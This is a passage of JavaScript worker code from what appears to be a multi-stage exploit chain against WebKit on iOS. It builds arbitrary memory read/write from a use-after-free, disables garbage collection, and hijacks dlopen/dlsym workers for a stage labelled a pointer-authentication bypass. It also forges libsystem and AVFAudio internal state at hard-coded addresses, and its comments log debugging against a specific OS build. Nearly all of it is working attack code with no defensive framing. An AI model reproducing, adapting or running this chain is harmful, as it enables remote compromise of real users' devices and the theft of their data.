    postMessage(`[stage7] slow_dlopen(libsystem_malloc) handle=${hex(malloc_handle)} (+${Date.now() - __t0}ms)`);
    __t0 = Date.now(); __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
    const webcore_handle = await slow_dlopen('/System/Library/PrivateFrameworks/WebCore.framework/WebCore', 0n);
    clearInterval(__tick);
    postMessage(`[stage7] slow_dlopen(WebCore) handle=${hex(webcore_handle)} (+${Date.now() - __t0}ms)`);
    __t0 = Date.now(); __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
    // PAL_getPKContactClass probe is INFORMATIONAL only: nm on the 23B85 WebCore shows the ONLY
    // symbol of that name is the softlink DATA slot (S @ 0x1ed61cff8); the function code
    // (0x19eb92e04, already leaked from that slot = paciza_PAL_initPKContact) is hidden-visibility
    // PAL statically linked into WebCore, so dlsym CANNOT resolve it (returns 0 by design). The
    // real dlsym-correctness MATCH uses WebCore-exported symbols with nm-pre-verified addresses
    // (same proof as malloc, whose dlsym result was bit-exact: unslid 0x18e532040 == T _malloc).
    const pkc = await slow_dlsym(webcore_handle, 'ZN3PAL17getPKContactClassE');
    clearInterval(__tick);
    postMessage(`[stage7] slow_dlsym(PAL_getPKContactClass)=${hex(pkc)} (expect 0: hidden PAL-internal; code ptr already proven = 0x19eb92e04+slide from the softlink global) (+${Date.now() - __t0}ms)`);
    let __match = false;
    for (const [sym, want] of [
        ['ZN3JSC13RuntimeMethod15subspaceForImplERNS_2VME', 0x1a023d3bcn],
        ['InitWebCoreThreadSystemInterface', 0x1a1256d00n],
        ['Z41WebCoreObjCScheduleDeallocateOnMainThreadP10objc_classP11objc_object', 0x19fcea378n],
    ]) {
        __t0 = Date.now(); __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
        const r = await slow_dlsym(webcore_handle, sym);
        clearInterval(__tick);
        const unslid = noPAC(r) - p.slide;
        const ok = unslid === want;
        __match = __match || ok;
        postMessage(`[stage7] slow_dlsym(${sym})=${hex(r)} unslid=${hex(unslid)} want=${hex(want)} -> ${ok ? 'MATCH' : 'no'} (+${Date.now() - __t0}ms)`);
        if (ok) break;
    }
    const malloc_sym = await slow_dlsym(malloc_handle, 'malloc');
    const malloc_unslid = noPAC(malloc_sym) - p.slide;
    const malloc_ok = malloc_unslid === 0x18e532040n;   // T _malloc, nm-verified on 23B85
    postMessage(`[stage7] slow_dlsym(malloc)=${hex(malloc_sym)} unslid=${hex(malloc_unslid)} -> ${malloc_ok ? 'MATCH' : 'no'}`);
    const __ok = malloc_handle !== 0n && webcore_handle !== 0n && __match && malloc_ok;
    postMessage(`[stage7] fcall self-test ${__ok ? 'PASSED' : 'FAILED -- values above'}`);
    // LATENT-BOMB DEFUSAL (2026-07-21, post-PASSED brks 230439.ips/230455.ips): worker1's gate
    // block hangs in the Bambi analytics XPC and can complete SECONDS after the run ends (§5r);
    // its dispatch_once completion asserts token==w1tok and brks the process on any other value.
    // worker2's late completion is always legal (its w2tok seed persists; §5r) -- so once
    // worker2's completion has fired (token==-1), re-seed w1tok&~3 so worker1's late completion
    // also always finds its own port. If worker2 is still pending (token!=-1), KEEP its seed --
    // worker2 earned the gate at stage6 and takes priority; worker1's bomb stays the rare
    // residual (and the blocks' XPC latency is correlated, so when worker2 hangs, worker1
    // usually hangs too and no completion fires at all).
    try {
        p.reestablishRead64();
        const __tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
        if (__tok === 0xffffffffffffffffn) {
            const __w1 = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x11111111n);
            p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, BigInt(__w1.threadPort) & ~3n);
            postMessage(`[stage7] defused worker1's latent gate bomb (token -1 -> w1tok seed)`);
        } else {
            postMessage(`[stage7] token=${hex(__tok)} (worker2 pending) -- keeping w2tok seed`);
        }
    } catch (e) { postMessage('[stage7] bomb-defusal ERR ' + (e && (e.message || e))); }
}
self.onmessage = async function (e) {
    try {
        const data = e.data;

        switch (data.type) {
            case 'stage1': {
                const rw = await acquireRW();
                if (!rw) {
                    postMessage("[stage1] FAILED: reclaim never landed");
                    break;
                }
                if (!buildScribbleRW(rw.addrof, rw.fakeobj)) {
                    postMessage("[stage1] FAILED: could not build scribble R/W");
                    break;
                }
                // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
                // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
                // the rebuild self-check failed.

                if (p.rwRebuildOk) {
                    p.addrof = p.addrofRW;
                    p.fakeobj = p.fakeobjRW;
                    postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
                } else {
                    p.addrof = rw.addrof;
                    p.fakeobj = rw.fakeobj;
                    postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
                }
                // verify the primitives are correct before we trust them downstream
                if (!sanityCheckRW()) {
                    postMessage("[stage1] ABORT: R/W self-test failed");
                    break
                }
                // secure the fakes immediately: turn GC off before yielding to the event loop
                disableGC();
                postMessage("[stage1] arbitrary read64/write64 ready (GC off)");
                // hand off to stage2 (main thread bounces { type: 'stage2' } back)
                postMessage("request_stage2");
                break;
            }

            case 'stage2': {
                await stage2();
                // bridge to the dlopen-worker dance (main thread spawns the helpers)
                postMessage("prepare_dlopen_workers");
                break;
            }

            case 'stage3': {
                await stage3();
                postMessage("dlopen_workers_prepared");
                break;
            }

            case 'stage4': {
                await stage4();
                postMessage("trigger_dlopen_worker1");
                p.workerParked = true;   // worker1 parks at its __cxa_atexit (stage4's 0x102 arm) -> atexitWake sites may land 0x101
                // REGISTRATION-WAIT + IMMEDIATE SILENCE (2026-07-22, the dominant stall root): the
                // moment worker1 registers (+0x100 on stage4's 0x102 arm), the word holds count>gen,
                // so EVERY ambient __cxa_atexit unlock in the process drops to worker1 -- waking it
                // BEFORE the stage5 metadata/vector writes land (~500ms later) -> its dlopen_from
                // epilogue runs resize(0) on an unwritten forged vector -> garbage store -> attempt
                // lost (CAS->drop->store cliff). Poll for the registration HERE (right after the
                // trigger, ~0-400ms) and SILENCE the instant it shows: ambient unlocks then take the
                // fast path (count==gen), worker1 stays asleep until the deliberate mapredir ARM.
                // REGISTRATION-WAIT + IMMEDIATE SILENCE (2026-07-22, the dominant stall root): the
                // moment worker1 registers (+0x100 on stage4's 0x102 arm), the word holds count>gen,
                // so EVERY ambient __cxa_atexit unlock in the process drops to worker1 -- waking it
                // BEFORE the stage5 metadata/vector writes land (~500ms later) -> its dlopen_from
                // epilogue runs resize(0) on an unwritten forged vector -> garbage store -> attempt
                // lost (CAS->drop->store cliff). (2026-07-23: the silence was REMOVED then RESTORED --
                // removing it did NOT improve the wake, so it is not the orphaner; it still guards
                // the early-wake cliff.) Poll for the registration HERE and SILENCE the instant it shows.
                {
                    const __A = p.offsets.libsystem_c__atexit_mutex + p.structs.Atexit_mutexState;
                    let __w0 = 0;
                    while ((p.read64(__A) & 0xffffff00n) < 0x200n) { if (++__w0 > 1000000) break; await spinYieldCool(__w0); }   // registration shows in 0-400ms when it works; 1M cool spins ~= 12s bound, cool enough to not cook the device
                    // COUNT-MATCH (2026-07-23, lldb-proven): worker1's psynch wait is keyed to the word AT ITS
                    // PARK (observed mgen=0x302 = count 3, gen 0 -- the ARM's fake 0x101 count=1 doesn't match
                    // it -> the spare's drop advertises the wrong generation -> worker1 never wakes). Capture
                    // the park word HERE (before the silence zeroes the count) so the stage5 ARM can arm with
                    // worker1's ACTUAL count -> the spare's drop then advertises a matching generation.
                    p.parkWord = p.read64(__A);
                    atexitSilent();   // count==gen: ambient unlocks take the fast path -> no early drop to worker1
                    postMessage(`[stage4] worker1 registration ${(p.read64(__A) & 0xffffff00n) >= 0x200n ? 'seen, silenced immediately' : 'NOT seen (may have sailed)'} after ${__w0} spins; parkWord=${hex(p.parkWord)}`);
                }
                break;
            }
            case 'stage5': {
                // dlopen worker1 is triggered now
                const __ok5 = await stage5();
                if (__ok5 !== false) { postMessage("trigger_dlopen_worker2"); p.workerParked = true; }   // worker2 parks at stage6's hold
                else postMessage("[stage5] worker2 NOT triggered -- worker1 still parked (seed left in place; no crash)");
                break;
            }
            case 'stage6': {
                // dlopen worker2 is triggered now
                await stage6();
                break;
            }
            case 'stage7': {
                // do pac bypass
                await stage7();
                break;
            }
            case 'slow_fcall_done': {
                // PROBE ONLY (2026-08-02): the promise now resolves via slow_fcall_1/2's POLL (the
                // detector scan may run async and write the result after this message arrives), so do
                // NOT resolve here. Log whether the sentinel was overwritten (gadget ran) or intact.
                const __SENT = 0xfeedfacecafebeefn;
                const __r = p.slowFcallResult ? p.slowFcallResult[0] : 0xdeaddeadn;
                const __called = __r !== __SENT;
                slog(`[sfd] slow_fcall_done received; resolve=${slow_fcall_resolve ? 'set (poll will take it)' : 'NULL'} result=${hex(__r)}${__called ? ' (gadget RAN)' : ' (SENTINEL INTACT -- poll will wait for the async scan)'}`);
                try {
                    if (p.invoker_x0 && p.slowFcallResult && p.gSecurityd) {
                        slog(`[sfd] probe x0=${hex(p.invoker_x0[0x28 / 8])} x1=${hex(p.invoker_x0[0x30 / 8])} x2=${hex(p.invoker_x0[0x38 / 8])} resultPtr=${hex(p.invoker_x0[0x20 / 8])} result=${hex(__r)} pc=${hex(p.gSecurityd[0x80 / 8])} softlinkSlot=${hex(p.read64(p.offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray))} scannerObj=${hex(p.read64(p.offsets.WebCore__TND_scannerObject))} phoneScanner=${hex(p.read64(p.offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value))} tndFlag=${hex(p.read64(p.offsets.WebCore__TND_supportedFlag))} tndOnce=${hex(p.read64(p.offsets.WebCore__TND_scannerOnce))}`);
                    }
                } catch (e) { slog(`[sfd] probe ERR ${e && (e.message || e)}`); }
                if (!__called) { try { armTelephoneGate('sfd-check', false, false); } catch (e) { } }   // sentinel intact -> dump the parsing-enabled gate state (was find() gated off?)
                break;
            }
            case 'caption_done': {
                // page finished the caption carrier (stage5 fcall bring-up); the chain polls the
                // globals directly, so this is just a liveness ack -- nothing to do.
                break;
            }
            case 'poll_locks': {
                postMessage('poll_ready');          // ack BEFORE the blocking poll starts
                pollLocks(data);
                break;
            }
            case 'poll_ready': {
                if (p._pollReadyResolve) { const r = p._pollReadyResolve; p._pollReadyResolve = null; r(); }
                break;
            }
        }
    } catch (e) {
        postMessage('[ERROR] ' + e.toString());
    }
};
